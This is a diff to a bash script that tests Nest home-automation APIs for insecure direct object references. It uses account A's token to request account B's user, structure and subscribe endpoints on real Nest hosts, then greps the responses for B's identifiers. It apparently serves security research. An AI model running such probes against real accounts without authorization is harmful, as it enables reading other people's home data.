@@ -32,9 +32,9 @@ set -o pipefail
 OUTDIR="${OUTDIR:-$HOME/nest3}"; export OUTDIR; mkdir -p "$OUTDIR"
 : "${NEST_TOKEN_A:?set NEST_TOKEN_A='Basic g.0...' (account A token, keep private)}"
 : "${NEST_UID_A:?set NEST_UID_A=<A numeric userid>}"
-: "${NEST_STRUCT_A:?set NEST_STRUCT_A=<A structure uuid>}"
 : "${NEST_UID_B:?set NEST_UID_B=<B numeric userid>}"
-: "${NEST_STRUCT_B:?set NEST_STRUCT_B=<B structure uuid>}"
+NEST_STRUCT_A="${NEST_STRUCT_A:-}"          # optional
+NEST_STRUCT_B="${NEST_STRUCT_B:-}"          # optional (enables structure/subscribe tests)
 NEST_TRANSPORT="${NEST_TRANSPORT:-https://czfe53-front01-iad01.transport.home.nest.com}"
 UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126 Safari/537.36'
 R="https://home.nest.com"
@@ -52,8 +52,12 @@ call(){ local m="$1" url="$2" bf="${3:-}" extra=()
   curl -s -L --max-time 25 -H "User-Agent: $UA" -H "Authorization: $NEST_TOKEN_A" \
     "${extra[@]}" -X "$m" -o "$OUTDIR/resp.bin" -w '%{http_code}' "$url" 2>/dev/null
 }
-# does the response contain B's id (=> A read B's data)?
-leaked(){ grep -qiE "$NEST_STRUCT_B|\"$NEST_UID_B\"|user\.$NEST_UID_B|structure\.$NEST_STRUCT_B" "$OUTDIR/resp.bin" 2>/dev/null; }
+# does the response contain B's id (=> A read B's data)?  (safe when struct empty)
+leaked(){
+  grep -qE "\"$NEST_UID_B\"|user\.$NEST_UID_B" "$OUTDIR/resp.bin" 2>/dev/null && return 0
+  [ -n "$NEST_STRUCT_B" ] && grep -qF "$NEST_STRUCT_B" "$OUTDIR/resp.bin" 2>/dev/null && return 0
+  return 1
+}
 
 printf '%s' "$APP_BODY" > "$OUTDIR/app.json"
 : > "$OUTDIR/IDOR.txt"
@@ -74,6 +78,7 @@ echo "═══ 1: A -> B  user/app_launch (userid in path) ═══"
 c=$(call POST "$R/api/0.1/user/$NEST_UID_B/app_launch" "$OUTDIR/app.json"); verdict "user.$NEST_UID_B/app_launch" "$c"
 echo ""
 
+if [ -n "$NEST_STRUCT_B" ]; then
 echo "═══ 2: A -> B  structure entitlements (structure id in path) ═══"
 c=$(call GET "$R/api/0.1/structure/$NEST_STRUCT_B/entitlements"); verdict "structure.$NEST_STRUCT_B/entitlements" "$c"
 echo ""
@@ -84,6 +89,14 @@ for OK in "structure.$NEST_STRUCT_B" "user.$NEST_UID_B" "where.$NEST_STRUCT_B"; 
   c=$(call POST "$NEST_TRANSPORT/v5/subscribe" "$OUTDIR/sub.json"); verdict "subscribe $OK" "$c"
 done
 echo ""
+else
+echo "═══ 2-3: skipped (set NEST_STRUCT_B to also test structure/subscribe) ═══"
+echo "  (still testing the key user/app_launch path above with B's uid)"; echo ""
+# still test the user bucket subscribe (needs only uid_B)
+printf '{"objects":[{"object_key":"user.%s","object_revision":1,"object_timestamp":1}]}' "$NEST_UID_B" > "$OUTDIR/sub.json"
+c=$(call POST "$NEST_TRANSPORT/v5/subscribe" "$OUTDIR/sub.json"); verdict "subscribe user.$NEST_UID_B" "$c"
+echo ""
+fi
 
 echo "════════════════════════════════════════════"
 echo "VERDICT"
